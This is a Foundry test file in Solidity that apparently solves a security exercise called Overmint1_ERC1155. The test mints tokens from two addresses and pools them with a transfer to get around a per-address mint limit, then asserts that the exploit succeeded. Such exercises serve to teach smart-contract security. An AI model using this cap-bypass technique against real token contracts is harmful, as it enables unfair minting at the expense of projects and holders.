// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {Overmint1_ERC1155} from "../src/Overmint1_ERC1155.sol";

contract CounterTest is Test {
    address user1;
    address user2;
    Overmint1_ERC1155 public victim;

    function setUp() public {
        victim = new Overmint1_ERC1155();
        user1 = vm.addr(1);
        user2 = vm.addr(2);
        vm.deal(user1, 100 ether);
        vm.deal(user2, 100 ether);
    }

    function test_exploit() public {
        vm.startPrank(user1);
        victim.mint(0, '');
        victim.mint(0, '');
        victim.mint(0, '');

        vm.startPrank(user2);
        victim.mint(0, '');
        victim.mint(0, '');

        victim.safeTransferFrom(user2, user1, 0, 2, '');

        assertTrue(victim.success(user1, 0), "Exploit failed.");
    }
}
